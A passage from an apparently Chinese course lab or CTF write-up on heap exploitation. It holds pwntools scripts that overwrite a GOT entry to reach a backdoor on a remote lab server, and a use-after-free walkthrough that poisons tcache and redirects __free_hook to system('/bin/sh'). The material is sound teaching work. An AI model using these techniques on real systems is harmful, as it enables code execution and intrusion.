<a id="__codelineno-5-46" name="__codelineno-5-46"></a><a href="#__codelineno-5-46"><span class="linenos" data-linenos="46 "></span></a><span class="p">):</span>
<a id="__codelineno-5-47" name="__codelineno-5-47"></a><a href="#__codelineno-5-47"><span class="linenos" data-linenos="47 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-48" name="__codelineno-5-48"></a><a href="#__codelineno-5-48"><span class="linenos" data-linenos="48 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
<a id="__codelineno-5-49" name="__codelineno-5-49"></a><a href="#__codelineno-5-49"><span class="linenos" data-linenos="49 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-50" name="__codelineno-5-50"></a><a href="#__codelineno-5-50"><span class="linenos" data-linenos="50 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-5-51" name="__codelineno-5-51"></a><a href="#__codelineno-5-51"><span class="linenos" data-linenos="51 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-52" name="__codelineno-5-52"></a><a href="#__codelineno-5-52"><span class="linenos" data-linenos="52 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-5-53" name="__codelineno-5-53"></a><a href="#__codelineno-5-53"><span class="linenos" data-linenos="53 "></span></a>
<a id="__codelineno-5-54" name="__codelineno-5-54"></a><a href="#__codelineno-5-54"><span class="linenos" data-linenos="54 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-55" name="__codelineno-5-55"></a><a href="#__codelineno-5-55"><span class="linenos" data-linenos="55 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_name</span><span class="p">)</span>
<a id="__codelineno-5-56" name="__codelineno-5-56"></a><a href="#__codelineno-5-56"><span class="linenos" data-linenos="56 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new introduction &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-57" name="__codelineno-5-57"></a><a href="#__codelineno-5-57"><span class="linenos" data-linenos="57 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_intro</span><span class="p">)</span>
<a id="__codelineno-5-58" name="__codelineno-5-58"></a><a href="#__codelineno-5-58"><span class="linenos" data-linenos="58 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-59" name="__codelineno-5-59"></a><a href="#__codelineno-5-59"><span class="linenos" data-linenos="59 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_motto</span><span class="p">)</span>
<a id="__codelineno-5-60" name="__codelineno-5-60"></a><a href="#__codelineno-5-60"><span class="linenos" data-linenos="60 "></span></a>    <span class="k">return</span>
<a id="__codelineno-5-61" name="__codelineno-5-61"></a><a href="#__codelineno-5-61"><span class="linenos" data-linenos="61 "></span></a>
<a id="__codelineno-5-62" name="__codelineno-5-62"></a><a href="#__codelineno-5-62"><span class="linenos" data-linenos="62 "></span></a><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;8.154.20.109&#39;</span><span class="p">,</span><span class="mi">10401</span><span class="p">)</span>
<a id="__codelineno-5-63" name="__codelineno-5-63"></a><a href="#__codelineno-5-63"><span class="linenos" data-linenos="63 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;StudentID:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-5-64" name="__codelineno-5-64"></a><a href="#__codelineno-5-64"><span class="linenos" data-linenos="64 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;----------&#39;</span><span class="p">)</span><span class="o">//</span><span class="n">学号</span>
<a id="__codelineno-5-65" name="__codelineno-5-65"></a><a href="#__codelineno-5-65"><span class="linenos" data-linenos="65 "></span></a><span class="c1"># p = process(&#39;./overflow&#39;)  </span>
<a id="__codelineno-5-66" name="__codelineno-5-66"></a><a href="#__codelineno-5-66"><span class="linenos" data-linenos="66 "></span></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./overflow&quot;</span><span class="p">)</span>
<a id="__codelineno-5-67" name="__codelineno-5-67"></a><a href="#__codelineno-5-67"><span class="linenos" data-linenos="67 "></span></a>
<a id="__codelineno-5-68" name="__codelineno-5-68"></a><a href="#__codelineno-5-68"><span class="linenos" data-linenos="68 "></span></a><span class="n">A</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-5-69" name="__codelineno-5-69"></a><a href="#__codelineno-5-69"><span class="linenos" data-linenos="69 "></span></a><span class="n">B</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">)</span>
<a id="__codelineno-5-70" name="__codelineno-5-70"></a><a href="#__codelineno-5-70"><span class="linenos" data-linenos="70 "></span></a><span class="n">C</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CCC&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;CCC&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;CCC&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;CCC&#39;</span><span class="p">)</span>
<a id="__codelineno-5-71" name="__codelineno-5-71"></a><a href="#__codelineno-5-71"><span class="linenos" data-linenos="71 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">C</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;CCC&#39;</span><span class="p">)</span>
<a id="__codelineno-5-72" name="__codelineno-5-72"></a><a href="#__codelineno-5-72"><span class="linenos" data-linenos="72 "></span></a><span class="n">handle_del</span><span class="p">(</span><span class="n">B</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;BBB&#39;</span><span class="p">)</span>
<a id="__codelineno-5-73" name="__codelineno-5-73"></a><a href="#__codelineno-5-73"><span class="linenos" data-linenos="73 "></span></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x50</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">])</span>
<a id="__codelineno-5-74" name="__codelineno-5-74"></a><a href="#__codelineno-5-74"><span class="linenos" data-linenos="74 "></span></a><span class="n">handle_edit</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<a id="__codelineno-5-75" name="__codelineno-5-75"></a><a href="#__codelineno-5-75"><span class="linenos" data-linenos="75 "></span></a><span class="n">D</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;DDD&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;DDD&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;DDD&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;DDD&#39;</span><span class="p">)</span>
<a id="__codelineno-5-76" name="__codelineno-5-76"></a><a href="#__codelineno-5-76"><span class="linenos" data-linenos="76 "></span></a><span class="n">E</span><span class="o">=</span><span class="n">handle_add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]),</span><span class="sa">b</span><span class="s1">&#39;EEE&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;EEE&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;EEE&#39;</span><span class="p">)</span>
<a id="__codelineno-5-77" name="__codelineno-5-77"></a><a href="#__codelineno-5-77"><span class="linenos" data-linenos="77 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-5-78" name="__codelineno-5-78"></a><a href="#__codelineno-5-78"><span class="linenos" data-linenos="78 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;6&quot;</span><span class="p">)</span>
<a id="__codelineno-5-79" name="__codelineno-5-79"></a><a href="#__codelineno-5-79"><span class="linenos" data-linenos="79 "></span></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p><img alt="overflow" src="pic/overflow.jpg" /> </p>
<h4 id="uaf_1">Uaf<a class="headerlink" href="#uaf_1" title="Permanent link">&para;</a></h4>
<p>​   本题的程序使用了RELRO 保护，无法破坏 GOT 表内容。但是观察到程序中的<code>free()</code>函数的传入参数可以被控制，那么就可以通过泄露libc库中的<code>__free_hook</code>的地址，然后把该地址的内容修改为<code>system()</code>函数的地址，然后通过控制堆传入<code>\bin\sh</code>，即可完成攻击。</p>
<p>​   对于这个程序的攻击，首先需要获取libc库的基地址。在攻击脚本中，先申请了9个内存空间，然后释放掉前八个，这时先被释放的7个chunk将会填满tcache，于是最后释放的A chunk就被放入了unsorted bin中，此时A chunk的fd指针指向libc库中的<code>__malloc_hook</code>地址存在常数偏移的地址。由于存在uaf漏洞，可以对已经释放的A chunk调用<code>user_show()</code>，就可以泄露出这个相关地址。然后通过gdb的调试，得到这个offset为0x70，于是通过<code>lbase=leak_addr-libc.symbols['__malloc_hook']-0x70</code>就可以获取libc库的基地址，进而获取<code>__free_hook</code>和<code>system</code>的地址。</p>
<p>​   然后，再利用uaf漏洞对tcache上的第一个free chunk进行修改，将fd指针位置修改为<code>free_hook_addr</code>，然后申请内存空间A，同时将<code>A-&gt;intro</code>修改为<code>/bin/sh\0</code>，以便后续调用。此时，tcache的指针指向了<code>free_hook_addr</code>，于是再申请内存空间B，并传入<code>system_addr</code>，即可将<code>__free_hook</code>的指针篡改至<code>system()</code>函数。最后对A调用<code>user_del()</code>，即可触发<code>free(info-&gt;intro)</code>，此函数经篡改实际为<code>system("/bin/sh")</code>，完成攻击。</p>
<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><a href="#__codelineno-6-1"><span class="linenos" data-linenos="  1 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-6-2" name="__codelineno-6-2"></a><a href="#__codelineno-6-2"><span class="linenos" data-linenos="  2 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Tuple</span>
<a id="__codelineno-6-3" name="__codelineno-6-3"></a><a href="#__codelineno-6-3"><span class="linenos" data-linenos="  3 "></span></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<a id="__codelineno-6-4" name="__codelineno-6-4"></a><a href="#__codelineno-6-4"><span class="linenos" data-linenos="  4 "></span></a>
<a id="__codelineno-6-5" name="__codelineno-6-5"></a><a href="#__codelineno-6-5"><span class="linenos" data-linenos="  5 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_add</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">introsize</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">motto</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
<a id="__codelineno-6-6" name="__codelineno-6-6"></a><a href="#__codelineno-6-6"><span class="linenos" data-linenos="  6 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-7" name="__codelineno-6-7"></a><a href="#__codelineno-6-7"><span class="linenos" data-linenos="  7 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
<a id="__codelineno-6-8" name="__codelineno-6-8"></a><a href="#__codelineno-6-8"><span class="linenos" data-linenos="  8 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-9" name="__codelineno-6-9"></a><a href="#__codelineno-6-9"><span class="linenos" data-linenos="  9 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<a id="__codelineno-6-10" name="__codelineno-6-10"></a><a href="#__codelineno-6-10"><span class="linenos" data-linenos=" 10 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-11" name="__codelineno-6-11"></a><a href="#__codelineno-6-11"><span class="linenos" data-linenos=" 11 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-6-12" name="__codelineno-6-12"></a><a href="#__codelineno-6-12"><span class="linenos" data-linenos=" 12 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;introduction size &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-13" name="__codelineno-6-13"></a><a href="#__codelineno-6-13"><span class="linenos" data-linenos=" 13 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">introsize</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-6-14" name="__codelineno-6-14"></a><a href="#__codelineno-6-14"><span class="linenos" data-linenos=" 14 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;introduction &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-15" name="__codelineno-6-15"></a><a href="#__codelineno-6-15"><span class="linenos" data-linenos=" 15 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">intro</span><span class="p">)</span>
<a id="__codelineno-6-16" name="__codelineno-6-16"></a><a href="#__codelineno-6-16"><span class="linenos" data-linenos=" 16 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-17" name="__codelineno-6-17"></a><a href="#__codelineno-6-17"><span class="linenos" data-linenos=" 17 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">motto</span><span class="p">)</span>
<a id="__codelineno-6-18" name="__codelineno-6-18"></a><a href="#__codelineno-6-18"><span class="linenos" data-linenos=" 18 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;at index &quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<a id="__codelineno-6-19" name="__codelineno-6-19"></a><a href="#__codelineno-6-19"><span class="linenos" data-linenos=" 19 "></span></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-6-20" name="__codelineno-6-20"></a><a href="#__codelineno-6-20"><span class="linenos" data-linenos=" 20 "></span></a>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<a id="__codelineno-6-21" name="__codelineno-6-21"></a><a href="#__codelineno-6-21"><span class="linenos" data-linenos=" 21 "></span></a>
<a id="__codelineno-6-22" name="__codelineno-6-22"></a><a href="#__codelineno-6-22"><span class="linenos" data-linenos=" 22 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_del</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<a id="__codelineno-6-23" name="__codelineno-6-23"></a><a href="#__codelineno-6-23"><span class="linenos" data-linenos=" 23 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-24" name="__codelineno-6-24"></a><a href="#__codelineno-6-24"><span class="linenos" data-linenos=" 24 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
<a id="__codelineno-6-25" name="__codelineno-6-25"></a><a href="#__codelineno-6-25"><span class="linenos" data-linenos=" 25 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-26" name="__codelineno-6-26"></a><a href="#__codelineno-6-26"><span class="linenos" data-linenos=" 26 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-6-27" name="__codelineno-6-27"></a><a href="#__codelineno-6-27"><span class="linenos" data-linenos=" 27 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-28" name="__codelineno-6-28"></a><a href="#__codelineno-6-28"><span class="linenos" data-linenos=" 28 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-6-29" name="__codelineno-6-29"></a><a href="#__codelineno-6-29"><span class="linenos" data-linenos=" 29 "></span></a>    <span class="k">return</span>
<a id="__codelineno-6-30" name="__codelineno-6-30"></a><a href="#__codelineno-6-30"><span class="linenos" data-linenos=" 30 "></span></a>
<a id="__codelineno-6-31" name="__codelineno-6-31"></a><a href="#__codelineno-6-31"><span class="linenos" data-linenos=" 31 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_show</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">]:</span>
<a id="__codelineno-6-32" name="__codelineno-6-32"></a><a href="#__codelineno-6-32"><span class="linenos" data-linenos=" 32 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-33" name="__codelineno-6-33"></a><a href="#__codelineno-6-33"><span class="linenos" data-linenos=" 33 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
<a id="__codelineno-6-34" name="__codelineno-6-34"></a><a href="#__codelineno-6-34"><span class="linenos" data-linenos=" 34 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-35" name="__codelineno-6-35"></a><a href="#__codelineno-6-35"><span class="linenos" data-linenos=" 35 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-6-36" name="__codelineno-6-36"></a><a href="#__codelineno-6-36"><span class="linenos" data-linenos=" 36 "></span></a>
<a id="__codelineno-6-37" name="__codelineno-6-37"></a><a href="#__codelineno-6-37"><span class="linenos" data-linenos=" 37 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-38" name="__codelineno-6-38"></a><a href="#__codelineno-6-38"><span class="linenos" data-linenos=" 38 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-6-39" name="__codelineno-6-39"></a><a href="#__codelineno-6-39"><span class="linenos" data-linenos=" 39 "></span></a>
<a id="__codelineno-6-40" name="__codelineno-6-40"></a><a href="#__codelineno-6-40"><span class="linenos" data-linenos=" 40 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user name: &quot;</span><span class="p">)</span>
<a id="__codelineno-6-41" name="__codelineno-6-41"></a><a href="#__codelineno-6-41"><span class="linenos" data-linenos=" 41 "></span></a>    <span class="n">recv_name</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-6-42" name="__codelineno-6-42"></a><a href="#__codelineno-6-42"><span class="linenos" data-linenos=" 42 "></span></a>
<a id="__codelineno-6-43" name="__codelineno-6-43"></a><a href="#__codelineno-6-43"><span class="linenos" data-linenos=" 43 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user motto: &quot;</span><span class="p">)</span>
<a id="__codelineno-6-44" name="__codelineno-6-44"></a><a href="#__codelineno-6-44"><span class="linenos" data-linenos=" 44 "></span></a>    <span class="n">recv_motto</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-6-45" name="__codelineno-6-45"></a><a href="#__codelineno-6-45"><span class="linenos" data-linenos=" 45 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user intro: &quot;</span><span class="p">)</span>
<a id="__codelineno-6-46" name="__codelineno-6-46"></a><a href="#__codelineno-6-46"><span class="linenos" data-linenos=" 46 "></span></a>    <span class="n">recv_intro</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-6-47" name="__codelineno-6-47"></a><a href="#__codelineno-6-47"><span class="linenos" data-linenos=" 47 "></span></a>    <span class="k">return</span> <span class="n">recv_name</span><span class="p">,</span> <span class="n">recv_motto</span><span class="p">,</span> <span class="n">recv_intro</span>
<a id="__codelineno-6-48" name="__codelineno-6-48"></a><a href="#__codelineno-6-48"><span class="linenos" data-linenos=" 48 "></span></a>
<a id="__codelineno-6-49" name="__codelineno-6-49"></a><a href="#__codelineno-6-49"><span class="linenos" data-linenos=" 49 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_edit</span><span class="p">(</span>
<a id="__codelineno-6-50" name="__codelineno-6-50"></a><a href="#__codelineno-6-50"><span class="linenos" data-linenos=" 50 "></span></a>    <span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">edit_motto</span><span class="p">:</span> <span class="nb">bytes</span>
<a id="__codelineno-6-51" name="__codelineno-6-51"></a><a href="#__codelineno-6-51"><span class="linenos" data-linenos=" 51 "></span></a><span class="p">):</span>
<a id="__codelineno-6-52" name="__codelineno-6-52"></a><a href="#__codelineno-6-52"><span class="linenos" data-linenos=" 52 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-53" name="__codelineno-6-53"></a><a href="#__codelineno-6-53"><span class="linenos" data-linenos=" 53 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
<a id="__codelineno-6-54" name="__codelineno-6-54"></a><a href="#__codelineno-6-54"><span class="linenos" data-linenos=" 54 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;index &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-55" name="__codelineno-6-55"></a><a href="#__codelineno-6-55"><span class="linenos" data-linenos=" 55 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<a id="__codelineno-6-56" name="__codelineno-6-56"></a><a href="#__codelineno-6-56"><span class="linenos" data-linenos=" 56 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-57" name="__codelineno-6-57"></a><a href="#__codelineno-6-57"><span class="linenos" data-linenos=" 57 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-6-58" name="__codelineno-6-58"></a><a href="#__codelineno-6-58"><span class="linenos" data-linenos=" 58 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-6-59" name="__codelineno-6-59"></a><a href="#__codelineno-6-59"><span class="linenos" data-linenos=" 59 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">edit_name</span><span class="p">)</span>
<a id="__codelineno-6-60" name="__codelineno-6-60"></a><a href="#__codelineno-6-60"><span class="linenos" data-linenos=" 60 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;new introduction &gt; &quot;</span><span class="p">)</span>
